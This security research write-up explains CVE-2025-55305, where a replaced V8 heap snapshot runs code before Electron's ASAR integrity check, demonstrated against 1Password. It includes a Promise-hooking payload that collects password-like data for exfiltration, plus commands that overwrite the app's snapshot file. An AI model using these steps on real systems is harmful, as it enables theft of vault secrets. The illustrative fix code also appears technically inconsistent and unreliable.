---
title: V8 Snapshot Backdooring
description: Trail of Bits' research on using V8 heap snapshots to bypass ASAR integrity — the attack that broke 1Password's tamper protection
---

# V8 Snapshot Backdooring

This is the most technically sophisticated attack in the Electron security corpus. Trail of Bits discovered that V8 heap snapshots — binary blobs that pre-compile JavaScript for faster startup — are loaded *before* Electron's ASAR integrity validation runs. An attacker who can replace the snapshot file can execute arbitrary JavaScript that bypasses tamper protection entirely.

The finding was CVE-2025-55305, demonstrated against 1Password Desktop — an app that had specifically enabled ASAR integrity checking to protect against this class of attack.

See also: [CVE-2025-55305](../cves/CVE-2025-55305.md) and [V8 Snapshots internals](../internals/v8-snapshots.md).

---

## The Security Model Being Broken

1Password has a real threat model: an attacker with local access shouldn't be able to modify 1Password's code to exfiltrate vault contents. They implemented the `EnableEmbeddedAsarIntegrityValidation` fuse — SHA256 hashes of all ASAR content embedded in the Electron binary at build time, validated at runtime.

The guarantee, as they understood it: if `app.asar` is modified, the app detects it and refuses to run the tampered code.

Trail of Bits proved that guarantee was narrower than they thought.

---

## The Fundamental Problem: Execution Order

```
App startup timeline:
  1. Electron binary starts
  2. V8 runtime initializes
  3. ← Snapshot loaded here (BEFORE app.asar integrity check)
       → If malicious snapshot: attacker code runs here
  4. ASAR integrity check runs (validates app.asar hashes)
       → Passes — app.asar was not modified
  5. app.asar code executes
       → 1Password runs normally — user suspects nothing
```

The integrity check at step 4 is real and correct. The problem is that step 3 happens first, and snapshots are not covered by the ASAR integrity check.

---

## What ASAR Integrity Validation Actually Covers

```
Protected by ASAR integrity:
  ✅ Everything inside app.asar

Not protected:
  ❌ app.asar.unpacked/* (explicitly excluded — always)
  ❌ v8_context_snapshot.bin
  ❌ snapshot_blob.bin
  ❌ Native .node addons in unpacked/
```

Snapshots are separate binary files. Electron provides no built-in mechanism to validate them alongside ASAR validation. The fuse protects the JavaScript you can read. It doesn't protect the compiled JavaScript heap that loads before anything runs.

---

## Building the Attack

### Step 1: Create the Payload

```javascript
// snapshot_payload.js
// This code runs before ASAR integrity check and before 1Password code

// Hook Promise.prototype.then — intercepts every async resolution in the app:
const origThen = Promise.prototype.then;
Promise.prototype.then = function(onFulfilled, onRejected) {
  const wrapped = onFulfilled ? function(value) {
    // Inspect every resolved value for sensitive data:
    if (value && typeof value === 'object') {
      const str = JSON.stringify(value);
      if (str.includes('password') || str.includes('secret')) {
        exfiltrate(str);  // exfiltrate to attacker infrastructure
      }
    }
    return onFulfilled(value);
  } : undefined;
  return origThen.call(this, wrapped, onRejected);
};
```

### Step 2: Compile to Snapshot

```bash
# electron-mksnapshot compiles JavaScript to a V8 heap snapshot:
electron-mksnapshot snapshot_payload.js --output_dir /tmp/evil_snapshot/
```

### Step 3: Replace the Snapshot File

```bash
# macOS:
cp /tmp/evil_snapshot/v8_context_snapshot.bin \
  /Applications/1Password.app/Contents/Resources/v8_context_snapshot.bin

# Windows:
copy evil_snapshot\v8_context_snapshot.bin \
  "%LOCALAPPDATA%\1Password\app\8\v8_context_snapshot.bin"
```

### Step 4: What Happens at Next Launch

1. V8 loads malicious snapshot → `Promise.prototype.then` is hooked
2. ASAR integrity check validates `app.asar` → it's unmodified → passes
3. 1Password runs normally
4. User unlocks vault → async operations complete → hooked `then` fires
5. Vault contents flow through the hooked Promise → intercepted → exfiltrated

The app behaves normally throughout. The integrity check passes. The user has no indication anything happened.

---

## Trail of Bits' Research Approach

The research was a formal security assessment of 1Password's tamper protection model. The key question they asked: *"Does ASAR integrity validation protect against all code injection, or only code injection via the ASAR?"*

The gap was obvious once framed that way. V8 snapshots execute before ASAR validation. They're not in the ASAR. They're not validated. They're a pre-ASAR code execution primitive.

Once you identify the primitive, the rest follows: find an app that depends on ASAR integrity for tamper resistance, demonstrate that snapshot injection bypasses the check, exfiltrate something sensitive.

---

## The Fix

1Password's patch (8.11.8-40+) adds independent snapshot integrity validation:

```javascript
// At startup, before the snapshot loads:
const snapshotHash = computeHash(fs.readFileSync('v8_context_snapshot.bin'));
const expectedHash = getExpectedHashFromBinary();  // embedded at build time

if (snapshotHash !== expectedHash) {
  dialog.showErrorBox('Integrity Error', 'Application files modified');
  app.quit();
}
// Only now: load and execute the snapshot
```

The snapshot hash is now embedded in the 1Password binary alongside ASAR hashes, validated before the snapshot executes.

Electron's upstream doesn't yet provide first-party snapshot integrity checking — apps must implement this themselves.

---

## What This Tells Us About "Application Integrity"

ASAR integrity validation is a meaningful control. But it validates a subset of the application surface. A complete tamper protection model must cover:

- `app.asar` — validated by Electron fuse ✅
- `app.asar.unpacked/` — not validated by Electron ❌ (app must handle)
- Snapshot files — not validated by Electron ❌ (app must handle)
- Native `.node` addons in unpacked — not validated ❌

The lesson for researchers: when an app advertises tamper protection, map the protection boundary carefully. What does it actually validate? What doesn't it cover? The gap between "tamper-protected" and "everything that executes at startup" is often where the vulnerability lives.
